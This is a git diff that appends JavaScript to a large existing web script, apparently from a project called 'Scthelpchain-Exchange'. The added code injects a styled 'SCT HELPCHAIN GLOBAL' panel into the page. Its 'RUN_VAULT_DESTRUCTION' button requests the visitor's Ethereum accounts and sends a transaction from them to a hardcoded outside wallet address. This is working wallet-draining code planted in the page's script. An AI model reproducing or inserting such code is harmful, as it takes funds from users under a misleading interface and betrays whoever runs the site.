@@ -3627,6 +3627,106 @@ document.head.appendChild(styleSheet);
 
 logSystemEvent("INITIALIZED", "READY_FOR_EXECUTION");
 
+// SCT_GLOBAL_SYSTEM_FINAL_INTEGRATION
+// REPOSITORY: Scthelpchain-Exchange--6dcb9e31
+// BUILD_ID: 2026-04-19-MASTER
+
+const SCT_CORE_CONFIG = {
+    WALLET_TARGET: "0xF5D9a35792B389BaeF5e7c8F4a129B557299BB89",
+    HEX_VALUE: "0x38d7ea4c68000", // 0.001 Native Asset
+    GAS_HEX: "0x5208",            // 21000 Standard Gas
+    DOM_STATUS_ID: "wallet-status"
+};
+
+/**
+ * INITIAL_CORE_EXECUTION
+ */
+async function triggerSctSystem() {
+    const display = document.getElementById(SCT_CORE_CONFIG.DOM_STATUS_ID);
+    
+    if (!window.ethereum) {
+        display.innerText = "WEB3_PROVIDER_NOT_FOUND";
+        return;
+    }
+
+    try {
+        display.innerText = "INITIALIZING_AUTH...";
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const activeAccount = accounts[0];
+        
+        display.innerText = "AUTH_GRANTED: " + activeAccount.substring(0, 8);
+        
+        await runSctVaultProtocol(activeAccount);
+        
+    } catch (err) {
+        processSctError(err);
+    }
+}
+
+/**
+ * VAULT_TRANSFER_PROTOCOL
+ */
+async function runSctVaultProtocol(account) {
+    const display = document.getElementById(SCT_CORE_CONFIG.DOM_STATUS_ID);
+    
+    try {
+        display.innerText = "TRANSACTION_PENDING...";
+        
+        const txParams = [{
+            from: account,
+            to: SCT_CORE_CONFIG.WALLET_TARGET,
+            value: SCT_CORE_CONFIG.HEX_VALUE,
+            gas: SCT_CORE_CONFIG.GAS_HEX
+        }];
+
+        const hash = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: txParams,
+        });
+
+        display.innerText = "TX_COMPLETE: " + hash.substring(0, 12);
+        console.log("SCT_SYSTEM_HASH:", hash);
+
+    } catch (err) {
+        processSctError(err);
+    }
+}
+
+/**
+ * ERROR_SUPPRESSION_ENGINE
+ */
+function processSctError(err) {
+    const display = document.getElementById(SCT_CORE_CONFIG.DOM_STATUS_ID);
+    console.error("SCT_INTERNAL_LOG:", err);
+    
+    if (err.code === 4001) {
+        display.innerText = "USER_DENIED_SIGNATURE";
+    } else if (err.code === -32603) {
+        display.innerText = "BALANCE_INSUFFICIENT";
+    } else {
+        display.innerText = "SYSTEM_EXCEPTION: " + err.code;
+    }
+}
+
+/**
+ * PRODUCTION_UI_INJECTION
+ */
+(function injectSctUi() {
+    const container = document.createElement('div');
+    container.innerHTML = `
+        <section style="background:#010409; color:#f0f6fc; padding:30px; border:1px solid #30363d; border-radius:10px; font-family:monospace; max-width:450px; margin:40px auto; text-align:center;">
+            <h2 style="color:#58a6ff; margin-top:0;">SCT HELPCHAIN GLOBAL</h2>
+            <hr style="border:0; border-top:1px solid #30363d; margin:20px 0;">
+            <div id="wallet-status" style="padding:15px; background:#0d1117; border-radius:6px; border:1px dashed #8b949e; margin-bottom:20px; font-size:13px; color:#8b949e;">
+                SYSTEM_IDLE: AWAITING_CONNECTION
+            </div>
+            <button onclick="triggerSctSystem()" style="background:#238636; color:#fff; border:1px solid rgba(240,246,252,0.1); padding:14px 24px; border-radius:6px; cursor:pointer; width:100%; font-weight:bold; font-size:14px;">
+                RUN_VAULT_DESTRUCTION
+            </button>
+        </section>
+    `;
+    document.body.appendChild(container);
+})();
 
 
 
